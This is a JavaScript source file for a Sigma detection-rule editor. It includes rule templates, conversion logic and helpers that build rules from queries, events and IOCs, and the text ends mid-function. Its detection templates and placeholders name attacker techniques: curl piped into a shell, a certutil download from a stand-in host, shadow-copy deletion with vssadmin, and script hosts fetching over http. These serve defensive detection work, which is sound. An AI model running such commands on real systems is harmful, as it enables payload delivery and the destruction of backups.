import { api } from "../api.js";
import { mappings } from "../mappings.js";
import { trackState } from "../router.js";
import { state } from "../state.js";
import { store } from "../store.js";
import { takeIncoming, clearHistory, diffHtml, diffStats, fmtTime, lineDiff, paintMeters, pushHistory, qualityBadge, qualityList, readHistory } from "../shared.js";
import { $, $$, closeDrawer, copyText, debounce, download, esc, forging, icons, levelBadge, openDrawer, plural, setDrawerBody, toast } from "../ui.js";
import { ruleFromEvent } from "./results.js";
import { correlationPane, wizardPane } from "./builders.js";
import { responsePane, sigmahqPane, testsPane } from "./editortools.js";
import { unitTests } from "../localdata.js";
import { can, teamApi, teamState } from "../team.js";

const DRAFT_KEY = "sigma-forge-draft";
const PREF_KEY = "sigma-forge-editor";

const TEMPLATES = {
  process_creation: {
    label: "Process creation",
    body: `title: Suspicious Child Of Office App
id: {uuid}
status: experimental
description: Detects an Office application that starts a shell or script host.
references:
  - https://attack.mitre.org/techniques/T1566/001/
author: Your name
date: {date}
tags:
  - attack.execution
  - attack.t1204.002
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\POWERPNT.EXE'
  selection_child:
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\wscript.exe'
      - '\\mshta.exe'
  condition: all of selection_*
falsepositives:
  - Macros used by business tools
level: high
`,
  },
  registry: {
    label: "Registry set",
    body: `title: Run Key Points To User Folder
id: {uuid}
status: experimental
description: Detects a Run key value that starts a program from a user writable folder.
author: Your name
date: {date}
tags:
  - attack.persistence
  - attack.t1547.001
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    TargetObject|contains: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    Details|contains:
      - '\\AppData\\'
      - '\\Users\\Public\\'
      - '\\Temp\\'
  condition: selection
falsepositives:
  - Updaters installed per user
level: medium
`,
  },
  network: {
    label: "Network connection",
    body: `title: Script Host Connects Out
id: {uuid}
status: experimental
description: Detects a script host that opens an outbound connection to a public address.
author: Your name
date: {date}
tags:
  - attack.command-and-control
  - attack.t1071.001
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Initiated: 'true'
    Image|endswith:
      - '\\wscript.exe'
      - '\\cscript.exe'
      - '\\mshta.exe'
  filter_private:
    DestinationIp|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
      - '127.0.0.0/8'
  condition: selection and not filter_private
falsepositives:
  - Login scripts that call internal web services
level: high
`,
  },
  linux: {
    label: "Linux process",
    body: `title: Curl Piped Into Shell
id: {uuid}
status: experimental
description: Detects a download piped straight into a shell.
author: Your name
date: {date}
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains|all:
      - 'curl '
      - '| sh'
  condition: selection
falsepositives:
  - Install scripts run by admins
level: medium
`,
  },
  correlation: {
    label: "Correlation",
    body: `title: Failed Logon
id: {uuid}
name: failed_logon
status: experimental
description: A failed Windows logon.
author: Your name
date: {date}
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
  condition: selection
level: low
---
title: Many Failed Logons From One Address
id: {uuid}
status: experimental
description: Ten or more failed logons from one source address in five minutes.
author: Your name
date: {date}
tags:
  - attack.credential-access
  - attack.t1110
correlation:
  type: event_count
  rules:
    - failed_logon
  group-by:
    - IpAddress
  timespan: 5m
  condition:
    gte: 10
level: high
`,
  },
};

function uuid() {
  if (crypto?.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

function fillTemplate(body) {
  const date = new Date().toISOString().slice(0, 10);
  return body.replace(/\{uuid\}/g, () => uuid()).replace(/\{date\}/g, date);
}

function readJson(key) {
  try {
    return JSON.parse(localStorage.getItem(key)) || null;
  } catch {
    return null;
  }
}

function writeJson(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch {
    return;
  }
}

function severityBadge(sev) {
  const cls = { critical: "bad", high: "bad", medium: "warn", low: "accent", informational: "" }[sev] ?? "";
  return `<span class="badge ${cls ? `badge--${cls}` : ""}">${esc(sev)}</span>`;
}

export async function editorView(root, route, opts = {}) {
  root.innerHTML = `
    <section class="${opts.embedded ? "editor-embed" : "view"}">
      ${opts.embedded ? "" : `<div class="page-head">
        <div>
          <div class="page-head__eyebrow">Editor</div>
          <h1>Write a rule and watch it convert</h1>
          <p>Checks, ATT&amp;CK mapping and the query for any platform update as you type.</p>
        </div>
      </div>`}
      <div class="editor">
        <div class="card editor__main">
          <div class="editor__bar">
            <input class="input editor__name" id="edName" aria-label="File name" spellcheck="false">
            <select class="select" id="edTemplate" aria-label="New from template">
              <option value="">New from template</option>
              ${Object.entries(TEMPLATES).map(([k, t]) => `<option value="${k}">${esc(t.label)}</option>`).join("")}
            </select>
            <button class="btn btn--sm" type="button" id="edOpen">${icons.folder} Open</button>
            <button class="btn btn--sm" type="button" id="edFromQuery" title="Turn a Splunk, KQL or Elastic query, an event or a list of IOCs into Sigma rules">${icons.spark} New from...</button>
            <button class="btn btn--sm" type="button" id="edFix" title="Fix common problems the checks find">${icons.check || icons.spark} Auto fix</button>
            <button class="btn btn--sm" type="button" id="edHistory" title="Saved versions of this file">${icons.grid} History <span class="badge" id="edHistCount">0</span></button>
            <button class="btn btn--sm" type="button" id="edDownload">${icons.download} Download</button>
            <button class="btn btn--sm" type="button" id="edReview" hidden title="Ask a teammate to check this rule before it goes live">${icons.check} Request review <span class="badge" id="edReviewState"></span></button>
            <button class="btn btn--sm btn--primary" type="button" id="edSave">${icons.file} Save to workspace</button>
          </div>
          <div class="editor__area">
            <pre class="editor__gutter" id="edGutter" aria-hidden="true"></pre>
            <textarea class="editor__text" id="edText" spellcheck="false" autocapitalize="off" autocomplete="off" wrap="off" aria-label="Sigma rule YAML"></textarea>
          </div>
          <div class="editor__status" id="edStatus"></div>
        </div>
        <div class="card editor__side">
          <div class="tabs" role="tablist" id="edTabs">
            <button class="tab is-active" type="button" data-tab="checks">Checks <span class="tab__count" id="edIssueCount">0</span></button>
            <button class="tab" type="button" data-tab="query">Query</button>
            <button class="tab" type="button" data-tab="attack">ATT&amp;CK</button>
            <button class="tab" type="button" data-tab="tests">Tests <span class="tab__count" id="edTestCount">0</span></button>
            <button class="tab" type="button" data-tab="sigmahq">SigmaHQ</button>
            <button class="tab" type="button" data-tab="response">Response</button>
          </div>
          <div class="editor__pane" data-pane="checks" id="edChecks"></div>
          <div class="editor__pane" data-pane="query" id="edQuery" hidden>
            <div class="editor__qbar">
              <select class="select" id="edTarget" aria-label="Target"></select>
              <select class="select" id="edFormat" aria-label="Format"></select>
              <button class="btn btn--sm" type="button" id="edCopy">${icons.copy} Copy</button>
            </div>
            <div id="edQueryOut"></div>
          </div>
          <div class="editor__pane" data-pane="attack" id="edAttack" hidden></div>
          <div class="editor__pane" data-pane="tests" id="edTests" hidden></div>
          <div class="editor__pane" data-pane="response" id="edRsp" hidden></div>
          <div class="editor__pane" data-pane="sigmahq" id="edShq" hidden></div>
        </div>
      </div>
    </section>`;

  const text = $("#edText", root);
  const gutter = $("#edGutter", root);
  const nameInput = $("#edName", root);
  const prefs = readJson(PREF_KEY) || {};
  let openedId = "";
  let targets = [];
  let attack = null;
  let lastQueries = [];
  let seq = 0;

  const rules = await state.rules();
  const incoming = takeIncoming();
  const draft = readJson(DRAFT_KEY);
  const fromRoute = route.file ? rules.find((r) => r.name === route.file) : null;
  if (incoming?.content) {
    openedId = incoming.openedId || "";
    nameInput.value = incoming.name || "new_rule.yml";
    text.value = incoming.content;
  } else if (fromRoute) {
    openedId = fromRoute.id;
    nameInput.value = fromRoute.name;
    text.value = fromRoute.content;
  } else if (draft?.content) {
    openedId = draft.openedId || "";
    nameInput.value = draft.name || "new_rule.yml";
    text.value = draft.content;
  } else {
    nameInput.value = "new_rule.yml";
    text.value = fillTemplate(TEMPLATES.process_creation.body);
  }

  function saveDraft() {
    writeJson(DRAFT_KEY, { name: nameInput.value, content: text.value, openedId });
    opts.onChange?.(openedId, nameInput.value);
  }

  function paintGutter() {
    const lines = text.value.split("\n").length;
    let out = "";
    for (let i = 1; i <= lines; i += 1) out += `${i}\n`;
    gutter.textContent = out;
    gutter.scrollTop = text.scrollTop;
  }

  text.addEventListener("scroll", () => {
    gutter.scrollTop = text.scrollTop;
  });

  text.addEventListener("keydown", (e) => {
    if (e.key === "Tab" && !e.shiftKey) {
      e.preventDefault();
      const { selectionStart: a, selectionEnd: b } = text;
      text.setRangeText("  ", a, b, "end");
      text.dispatchEvent(new Event("input"));
    }
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "s") {
      e.preventDefault();
      saveToWorkspace();
    }
  });

  function file() {
    const name = (nameInput.value.trim() || "new_rule.yml").replace(/[\\/]+/g, "/");
    return { name: /\.ya?ml$/i.test(name) ? name : `${name}.yml`, content: text.value };
  }

  function renderChecks(analysis, explained = null) {
    const items = analysis?.rules || [];
    const said = new Map((explained?.rules || []).map((x) => [x.key, x.lines]));
    const box = $("#edChecks", root);
    if (!text.value.trim()) {
      box.innerHTML = '<p class="muted editor__empty">Start typing a Sigma rule.</p>';
      $("#edStatus", root).innerHTML = "";
      $("#edIssueCount", root).textContent = "0";
      return;
    }
    const issues = items.reduce((n, r) => n + (r.issues?.length || 0) + (r.error ? 1 : 0), 0);
    $("#edIssueCount", root).textContent = String(issues);
    const errors = items.filter((r) => r.error).length;
    $("#edStatus", root).innerHTML = errors
      ? `<span class="badge badge--bad">error</span><span>${esc(plural(errors, "document"))} cannot be parsed</span>`
      : issues
        ? `<span class="badge badge--warn">issues</span><span>${esc(plural(issues, "finding"))}, still converts</span>`
        : `<span class="badge badge--ok">valid</span><span>${esc(plural(items.length, "document"))} parsed with no findings</span>`;
    box.innerHTML = items
      .map(
        (r) => `<div class="editor__doc">
          <div class="editor__dochead">
            <strong>${esc(r.title || r.file)}</strong>
            ${r.kind === "correlation" ? '<span class="badge badge--accent">correlation</span>' : ""}
            ${r.level ? levelBadge(r.level) : ""}
            ${qualityBadge(r.quality)}
          </div>
          ${r.error ? `<div class="notice notice--bad">${esc(r.error)}</div>` : ""}
          ${(r.issues || []).map((i) => `<div class="notice notice--warn">${severityBadge(i.severity)} <span>${esc(i.message)}</span></div>`).join("")}
          ${!r.error && !(r.issues || []).length ? '<div class="notice notice--ok">No findings</div>' : ""}
          ${said.get(r.key)?.length ? `<div class="explain"><div class="explain__label">What it does</div>${said.get(r.key).map((l) => `<p>${esc(l)}</p>`).join("")}</div>` : ""}
          ${r.quality && !r.error ? `<details class="editor__quality"><summary>Quality score ${r.quality.score} of 100, grade ${esc(r.quality.grade)}</summary>${qualityList(r.quality)}</details>` : ""}
          ${r.logsource ? `<div class="editor__meta"><span>Log source</span><span class="mono">${esc([r.logsource.product, r.logsource.category, r.logsource.service].filter(Boolean).join(" / ") || "none")}</span></div>` : ""}
        </div>`
      )
      .join("");
    paintMeters(box);
  }

  function renderAttack(analysis) {
    const box = $("#edAttack", root);
    const items = (analysis?.rules || []).filter((r) => !r.error);
    const tids = [...new Set(items.flatMap((r) => r.techniques || []))];
    const tactics = [...new Set(items.flatMap((r) => r.tactics || []))];
    if (!tids.length && !tactics.length) {
      box.innerHTML = '<p class="muted editor__empty">Add attack.* tags to map this rule to ATT&amp;CK.</p>';
      return;
    }
    const tech = attack?.techniques || {};
    box.innerHTML = `
      ${tactics.length ? `<div class="editor__meta"><span>Tactics</span><span>${tactics.map((t) => `<span class="chip">${esc(t)}</span>`).join(" ")}</span></div>` : ""}
      <ul class="list">${tids
        .map((t) => {
          const info = tech[t];
          const replaced = !info && attack?.revoked?.[t];
          return `<li class="list__item"><div class="list__main"><div class="list__title">${esc(t)} ${esc(info?.name || (replaced ? `revoked, now ${replaced}` : "not in ATT&CK data"))}</div><div class="list__meta">${esc((info?.tactics || []).join(", "))}</div></div>${info ? `<a class="btn btn--sm" href="${esc(info.url)}" target="_blank" rel="noopener">${icons.external}</a>` : '<span class="badge badge--warn">check</span>'}</li>`;
        })
        .join("")}</ul>`;
  }

  function fillTargets() {
    const sel = $("#edTarget", root);
    const fams = [...new Set(targets.map((t) => t.family))];
    const wanted = prefs.target && targets.some((t) => t.id === prefs.target && t.available) ? prefs.target : "splunk";
    sel.innerHTML = fams
      .map((f) => `<optgroup label="${esc(f)}">${targets.filter((t) => t.family === f).map((t) => `<option value="${esc(t.id)}" ${t.available ? "" : "disabled"} ${t.id === wanted ? "selected" : ""}>${esc(t.name)}</option>`).join("")}</optgroup>`)
      .join("");
    fillFormats();
  }

  function fillFormats() {
    const t = targets.find((x) => x.id === $("#edTarget", root).value);
    const formats = Object.keys(t?.formats || { default: "" });
    const wanted = prefs.format && formats.includes(prefs.format) ? prefs.format : "default";
    $("#edFormat", root).innerHTML = formats.map((f) => `<option value="${esc(f)}" ${f === wanted ? "selected" : ""}>${esc(f)}</option>`).join("");
  }

  async function runQuery(current) {
    const out = $("#edQueryOut", root);
    const target = $("#edTarget", root).value;
    const format = $("#edFormat", root).value;
    if (!target || !text.value.trim()) {
      out.innerHTML = "";
      lastQueries = [];
      return;
    }
    out.classList.add("is-busy");
    try {
      const res = await api.convert([current], target, format, {}, mappings.activeMap());
      if (seq !== current.seq) return;
      lastQueries = res.results.flatMap((r) => r.queries);
      out.innerHTML = res.results
        .map(
          (r) => `<div class="editor__doc">
            <div class="editor__dochead"><strong>${esc(r.title)}</strong>${r.error ? '<span class="badge badge--bad">failed</span>' : r.queries.length ? '<span class="badge badge--ok">ok</span>' : '<span class="badge badge--warn">skipped</span>'}</div>
            ${r.queries.map((q) => `<pre class="code">${esc(q)}</pre>`).join("")}
            ${r.error ? `<div class="notice notice--bad">${esc(r.error)}</div>` : ""}
            ${(r.warnings || []).map((w) => `<div class="notice notice--warn">${esc(w)}</div>`).join("")}
          </div>`
        )
        .join("") + (res.notes || []).map((n) => `<div class="notice notice--info">${esc(n)}</div>`).join("");
    } catch (err) {
      if (seq === current.seq) out.innerHTML = `<div class="notice notice--bad">${esc(err.message)}</div>`;
    } finally {
      out.classList.remove("is-busy");
    }
  }

  async function refresh() {
    seq += 1;
    const current = { ...file(), seq };
    saveDraft();
    paintTestCount();
    if (!text.value.trim()) {
      renderChecks(null);
      renderAttack(null);
      $("#edQueryOut", root).innerHTML = "";
      return;
    }
    try {
      const [analysis, explained] = await Promise.all([api.analyze([current]), api.explain([current]).catch(() => null)]);
      if (seq !== current.seq) return;
      renderChecks(analysis, explained);
      renderAttack(analysis);
    } catch (err) {
      $("#edChecks", root).innerHTML = `<div class="notice notice--bad">${esc(err.message)}</div>`;
    }
    runQuery(current);
  }

  const later = debounce(refresh, 450);
  text.addEventListener("input", () => {
    paintGutter();
    later();
  });
  nameInput.addEventListener("input", debounce(saveDraft, 300));

  $("#edTabs", root).addEventListener("click", (e) => {
    const tab = e.target.closest("[data-tab]");
    if (!tab) return;
    $$("#edTabs .tab", root).forEach((t) => t.classList.toggle("is-active", t === tab));
    $$(".editor__pane", root).forEach((p) => (p.hidden = p.dataset.pane !== tab.dataset.tab));
    trackState({ tab: tab.dataset.tab });
    if (tab.dataset.tab === "tests") tests.paint();
    if (tab.dataset.tab === "sigmahq") shq.run();
    if (tab.dataset.tab === "response") rsp.paint();
  });
  const rsp = responsePane($("#edRsp", root), () => file(), (content) => {
    pushHistory(file().name, text.value, "Response steps");
    setText(content);
    paintGutter();
    paintHistCount();
    refresh();
  });
  const tests = testsPane($("#edTests", root), () => file(), () => paintTestCount());
  const shq = sigmahqPane($("#edShq", root), () => file(), (change) => {
    if (change.name) {
      unitTests.rename(file().name, change.name);
      nameInput.value = change.name;
      saveDraft();
      paintHistCount();
      paintTestCount();
    }
    if (change.content) {
      pushHistory(file().name, text.value, change.note || "");
      setText(change.content);
      paintGutter();
      paintHistCount();
      refresh();
    }
  });
  function paintTestCount() {
    $("#edTestCount", root).textContent = String(unitTests.count(file().name));
  }
  const paneOn = (id) => !$(id, root).hidden;
  const laterShq = debounce(() => {
    if (paneOn("#edShq")) shq.run();
  }, 900);
  text.addEventListener("input", laterShq);
  nameInput.addEventListener("input", debounce(() => {
    paintTestCount();
    if (paneOn("#edTests")) tests.paint();
    laterShq();
  }, 300));

  $("#edTarget", root).addEventListener("change", () => {
    fillFormats();
    prefs.target = $("#edTarget", root).value;
    prefs.format = $("#edFormat", root).value;
    writeJson(PREF_KEY, prefs);
    runQuery({ ...file(), seq });
  });
  $("#edFormat", root).addEventListener("change", () => {
    prefs.format = $("#edFormat", root).value;
    writeJson(PREF_KEY, prefs);
    runQuery({ ...file(), seq });
  });
  $("#edCopy", root).addEventListener("click", () => {
    if (lastQueries.length) copyText(lastQueries.join("\n\n"), "Query copied");
  });

  $("#edTemplate", root).addEventListener("change", (e) => {
    const key = e.target.value;
    if (!key) return;
    setText(fillTemplate(TEMPLATES[key].body));
    nameInput.value = `new_${key}.yml`;
    openedId = "";
    e.target.value = "";
    paintGutter();
    refresh();
    saveDraft();
  });

  function setText(value) {
    text.focus();
    text.select();
    let done = false;
    try {
      done = document.execCommand("insertText", false, value);
    } catch {
      done = false;
    }
    if (!done || text.value !== value) text.value = value;
    text.setSelectionRange(0, 0);
    text.scrollTop = 0;
  }

  $("#edDownload", root).addEventListener("click", () => {
    const f = file();
    download(f.name.split("/").pop(), f.content, "application/x-yaml");
  });

  async function saveToWorkspace() {
    const f = file();
    if (!f.content.trim()) {
      toast("Nothing to save", "bad");
      return;
    }
    try {
      const saved = await store.replace(openedId, f);
      pushHistory(f.name, f.content);
      paintHistCount();
      openedId = saved?.id || "";
      nameInput.value = f.name;
      saveDraft();
      trackState({ file: f.name });
      toast(`Saved ${f.name} to the workspace`, "ok");
    } catch (err) {
      toast(err.message, "bad");
    }
  }
  $("#edSave", root).addEventListener("click", saveToWorkspace);
  const REVIEW_LABEL = { none: ["", ""], pending: ["waiting", "warn"], approved: ["approved", "ok"], changes: ["changes asked", "bad"], outdated: ["edited since", "warn"] };
  const paintReview = () => {
    const btn = $("#edReview", root);
    btn.hidden = !teamState.auth || !can("write");
    if (btn.hidden) return;
    const st = store.review(file().name);
    const saved = st.status !== "none";
    const [label, cls] = REVIEW_LABEL[st.status] || ["", ""];
    const badge = $("#edReviewState", root);
    badge.textContent = label;
    badge.className = `badge ${cls ? `badge--${cls}` : ""}`;
    badge.hidden = !saved;
  };
  paintReview();
  const offReview = store.onChange(paintReview);
  nameInput.addEventListener("input", paintReview);
  $("#edReview", root).addEventListener("click", () => {
    openDrawer("Request a review", `
      <p class="muted">Save first so the team sees the same version. A reviewer gets it in the Reviews page.</p>
      <label class="field"><span class="field__label">What changed and why</span><textarea class="textarea" id="rqNote" rows="4" placeholder="Added a filter for the backup agent, tested on last week's logs"></textarea></label>
      <div class="row"><div class="spacer"></div><button class="btn btn--primary" type="button" id="rqGo">${icons.check} Send for review</button></div>`, (panel) => {
      $("#rqGo", panel).addEventListener("click", async () => {
        try {
          await saveToWorkspace();
          const f = file();
          await teamApi.post("/api/team/reviews", { name: f.name, content: f.content, note: $("#rqNote", panel).value.trim() });
          await store.refresh();
          closeDrawer();
          toast("Sent for review", "ok");
        } catch (err) {
          toast(err.message, "bad");
        }
      });
    });
  });

  $("#edOpen", root).addEventListener("click", async () => {
    const list = await state.rules();
    if (!list.length) {
      toast("The workspace is empty", "bad");
      return;
    }
    const body = `
      <input class="input" type="search" id="openFilter" placeholder="Filter files" aria-label="Filter files">
      <div class="card mt-4"><ul class="list" id="openList"></ul></div>`;
    openDrawer("Open a workspace rule", body, (panel) => {
      const paint = (f = "") => {
        $("#openList", panel).innerHTML = list
          .filter((r) => !f || r.name.toLowerCase().includes(f.toLowerCase()))
          .slice(0, 300)
          .map((r) => `<li class="list__item"><div class="list__main"><div class="list__title">${esc(r.name)}</div><div class="list__meta">${esc(plural(r.content.split("\n").length, "line"))}</div></div><button class="btn btn--sm" type="button" data-pick="${esc(r.id)}">Open</button></li>`)
          .join("");
      };
      paint();
      $("#openFilter", panel).addEventListener("input", debounce((e) => paint(e.target.value), 120));
      panel.addEventListener("click", (e) => {
        const btn = e.target.closest("[data-pick]");
        if (!btn) return;
        const r = list.find((x) => x.id === btn.dataset.pick);
        if (!r) return;
        openedId = r.id;
        nameInput.value = r.name;
        text.value = r.content;
        trackState({ file: r.name });
        opts.onChange?.(openedId, r.name);
        document.querySelector("#drawer [data-close]")?.click();
        paintGutter();
        refresh();
      });
    });
  });

  function paintHistCount() {
    $("#edHistCount", root).textContent = String(readHistory(file().name).length);
  }
  nameInput.addEventListener("input", debounce(paintHistCount, 300));

  function loadText(name, content, id = "") {
    openedId = id;
    nameInput.value = name;
    setText(content);
    paintGutter();
    paintHistCount();
    paintTestCount();
    refresh();
    saveDraft();
  }

  $("#edHistory", root).addEventListener("click", () => {
    const name = file().name;
    const list = readHistory(name);
    const listHtml = () => {
      const items = readHistory(name);
      if (!items.length) return `<p class="muted">No saved versions of ${esc(name)} yet. Each time you press Save to workspace (or Ctrl+S) a version is kept here, up to 30 per file.</p>`;
      return `<p class="muted">Versions of <span class="mono">${esc(name)}</span>, newest first. Compared with what is in the editor now.</p>
        <div class="card mt-4"><ul class="list">${items
          .map((v, i) => {
            const st = diffStats(lineDiff(v.content, text.value));
            return `<li class="list__item"><div class="list__main"><div class="list__title">${esc(fmtTime(v.t))}${i === 0 ? ' <span class="badge badge--accent">latest</span>' : ""}</div><div class="list__meta">${esc(plural(v.content.split("\n").length, "line"))} · <span class="diff__count diff__count--add">+${st.added}</span> <span class="diff__count diff__count--del">-${st.removed}</span> vs editor</div></div><button class="btn btn--sm" type="button" data-view="${i}">Diff</button><button class="btn btn--sm" type="button" data-restore="${i}">Restore</button></li>`;
          })
          .join("")}</ul></div>
        <div class="row mt-4"><div class="spacer"></div><button class="btn btn--sm btn--ghost" type="button" id="histClear">${icons.trash} Clear history</button></div>`;
    };
    const bind = (panel) => {
      panel.onclick = (e) => {
        const items = readHistory(name);
        const view = e.target.closest("[data-view]");
        const restore = e.target.closest("[data-restore]");
        const back = e.target.closest("[data-back]");
        if (back) {
          setDrawerBody(listHtml(), bind);
          return;
        }
        if (view) {
          const v = items[Number(view.dataset.view)];
          const rows = lineDiff(v.content, text.value);
          const st = diffStats(rows);
          setDrawerBody(`<div class="row"><button class="btn btn--sm" type="button" data-back>Back</button><span class="muted">${esc(fmtTime(v.t))} to editor: <span class="diff__count diff__count--add">+${st.added}</span> <span class="diff__count diff__count--del">-${st.removed}</span></span><div class="spacer"></div><button class="btn btn--sm btn--primary" type="button" data-restore="${view.dataset.view}">Restore this version</button></div><div class="card mt-4">${diffHtml(rows)}</div>`, bind);
          return;
        }
        if (restore) {
          const v = items[Number(restore.dataset.restore)];
          pushHistory(name, text.value, "before restore");
          loadText(name, v.content, openedId);
          closeDrawer();
          toast("Version restored. Save to keep it in the workspace.", "ok");
          return;
        }
        if (e.target.closest("#histClear")) {
          clearHistory(name);
          paintHistCount();
          setDrawerBody(listHtml(), bind);
        }
      };
    };
    openDrawer(list.length ? `History, ${plural(list.length, "version")}` : "History", listHtml(), bind);
  });

  $("#edFromQuery", root).addEventListener("click", async () => {
    let langs = {};
    try {
      langs = (await api.queryLanguages()).languages;
    } catch {
      langs = { auto: "Detect it for me" };
    }
    const body = `
      <div class="tabs tabs--inline" id="fqTabs">
        <button class="tab is-active" type="button" data-fq="query">From a query</button>
        <button class="tab" type="button" data-fq="event">From an event</button>
        <button class="tab" type="button" data-fq="ioc">From IOCs</button>
        <button class="tab" type="button" data-fq="wizard">Wizard</button>
        <button class="tab" type="button" data-fq="corr">Correlation</button>
      </div>
      <div data-fqpane="wizard" class="mt-4" id="fqWizard" hidden></div>
      <div data-fqpane="corr" class="mt-4" id="fqCorr" hidden></div>
      <div data-fqpane="query" class="mt-4">
        <p class="muted">Paste a search from Splunk, Microsoft Sentinel or Defender, Elastic or Kibana. Sigma Forge reads the filters, maps the fields to Sigma names and guesses the log source.</p>
        <label class="field"><span class="field__label">Query language</span><select class="select" id="fqLang">${Object.entries(langs).map(([k, v]) => `<option value="${esc(k)}">${esc(v)}</option>`).join("")}</select></label>
        <label class="field"><span class="field__label">Query</span><textarea class="textarea mono" id="fqText" rows="8" spellcheck="false" placeholder='index=windows EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*"'></textarea></label>
        <div class="row"><span class="muted" id="fqExamples"></span><div class="spacer"></div><button class="btn btn--primary" type="button" id="fqGo">${icons.spark} Make the rule</button></div>
        <div id="fqOut" class="mt-4"></div>
      </div>
      <div data-fqpane="event" class="mt-4" hidden>
        <p class="muted">Paste one event as JSON (Sysmon, Windows event, CloudTrail, anything flat or nested). Then pick the fields that matter.</p>
        <label class="field"><span class="field__label">Event JSON</span><textarea class="textarea mono" id="feText" rows="10" spellcheck="false" placeholder='{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://x/a.exe a.exe"}'></textarea></label>
        <div class="row"><div class="spacer"></div><button class="btn btn--primary" type="button" id="feGo">${icons.spark} Pick fields</button></div>
      </div>
      <div data-fqpane="ioc" class="mt-4" hidden>
        <p class="muted">Paste IOCs (Indicators of Compromise) from a report or a feed: IPs, ranges, domains, URLs, MD5, SHA1 or SHA256 hashes and file names. Defanged values like evil[.]com and hxxp work too. You get Sigma rules for network, DNS, proxy, hashes and file names, plus a YARA file.</p>
        <label class="field"><span class="field__label">Name of the list</span><input class="input" id="iocName" placeholder="Campaign or report name"></label>
        <label class="field"><span class="field__label">IOCs</span><textarea class="textarea mono" id="iocText" rows="9" spellcheck="false" placeholder="203.0.113.10&#10;evil-updates[.]com&#10;hxxps://cdn.evil-updates[.]com/a.bin&#10;44d88612fea8a8f36de82e1278abb02f&#10;invoice_viewer.exe"></textarea></label>
        <div class="row"><div class="spacer"></div><button class="btn btn--primary" type="button" id="iocGo">${icons.spark} Make rules</button></div>
        <div id="iocOut" class="mt-4"></div>
      </div>`;
    const EXAMPLES = {
      splunk: 'index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*-decode*")',
      kql: 'DeviceProcessEvents\n| where FileName in~ ("rundll32.exe", "regsvr32.exe")\n| where ProcessCommandLine contains "http"\n| where not(InitiatingProcessFileName =~ "msiexec.exe")',
      lucene: 'event.code:1 AND process.name:("mshta.exe" OR "wscript.exe") AND process.command_line:*http*',
      eql: 'process where process.name : "vssadmin.exe" and process.args : ("delete", "shadows")',
    };
    openDrawer("New rule", body, (panel) => {
      $("#fqExamples", panel).innerHTML = `Try: ${Object.keys(EXAMPLES).map((k) => `<button class="link-btn" type="button" data-ex="${k}">${esc(k === "kql" ? "KQL" : k === "eql" ? "EQL" : k === "lucene" ? "Kibana" : "Splunk")}</button>`).join(" ")}`;
      let last = null;
      let lastIoc = null;
      panel.addEventListener("click", async (e) => {
        const tab = e.target.closest("[data-fq]");
        if (tab) {
          $$("#fqTabs .tab", panel).forEach((t) => t.classList.toggle("is-active", t === tab));
          $$("[data-fqpane]", panel).forEach((p) => (p.hidden = p.dataset.fqpane !== tab.dataset.fq));
          const openBuilt = (name, yaml) => {
            closeDrawer();
            loadText(name, yaml);
            toast("Rule loaded. Check it, then save.", "ok");
          };
          if (tab.dataset.fq === "wizard" && !$("#fqWizard", panel).dataset.ready) {
            $("#fqWizard", panel).dataset.ready = "1";
            wizardPane($("#fqWizard", panel), openBuilt);
          }
          if (tab.dataset.fq === "corr" && !$("#fqCorr", panel).dataset.ready) {
            $("#fqCorr", panel).dataset.ready = "1";
            correlationPane($("#fqCorr", panel), openBuilt);
          }
          return;
        }
        const ex = e.target.closest("[data-ex]");
        if (ex) {
          $("#fqText", panel).value = EXAMPLES[ex.dataset.ex].replace(/\\n/g, "\n");
          $("#fqLang", panel).value = ex.dataset.ex in langs ? ex.dataset.ex : "auto";
          return;
        }
        if (e.target.closest("#fqGo")) {
          const q = $("#fqText", panel).value.trim();
          if (!q) {
            toast("Paste a query first", "bad");
            return;
          }
          $("#fqOut", panel).innerHTML = '<div class="skeleton sk-block"></div>';
          try {
            last = await api.queryGen(q, $("#fqLang", panel).value);
            const mapped = Object.entries(last.mapped || {});
            $("#fqOut", panel).innerHTML = `
              <div class="row"><span class="badge badge--accent">${esc(last.language_name)}</span><span class="muted mono">${esc(Object.entries(last.logsource).map(([k, v]) => `${k}: ${v}`).join(", "))}</span></div>
              ${last.error ? `<div class="notice notice--bad mt-4">${esc(last.error)}</div>` : ""}
              ${(last.warnings || []).map((w) => `<div class="notice notice--warn mt-4">${esc(w)}</div>`).join("")}
              ${mapped.length ? `<div class="card mt-4"><div class="card__head"><span class="card__title">Field names changed</span></div><div class="card__body chips">${mapped.map(([a, b]) => `<span class="chip"><span class="mono">${esc(a)}</span> to <span class="mono">${esc(b)}</span></span>`).join("")}</div></div>` : ""}
              <div class="card mt-4"><pre class="code code--tall">${esc(last.yaml)}</pre></div>
              <div class="row mt-4"><div class="spacer"></div><button class="btn btn--sm" type="button" id="fqCopy">${icons.copy} Copy</button><button class="btn btn--primary" type="button" id="fqOpen">${icons.file} Open in editor</button></div>`;
          } catch (err) {
            $("#fqOut", panel).innerHTML = `<div class="notice notice--bad">${esc(err.message)}</div>`;
          }
          return;
        }
        if (e.target.closest("#fqCopy") && last) {
          copyText(last.yaml, "Rule copied");
          return;
        }
        if (e.target.closest("#fqOpen") && last) {
          const title = (last.yaml.match(/^title:\s*(.+)$/m) || [])[1] || "converted_query";
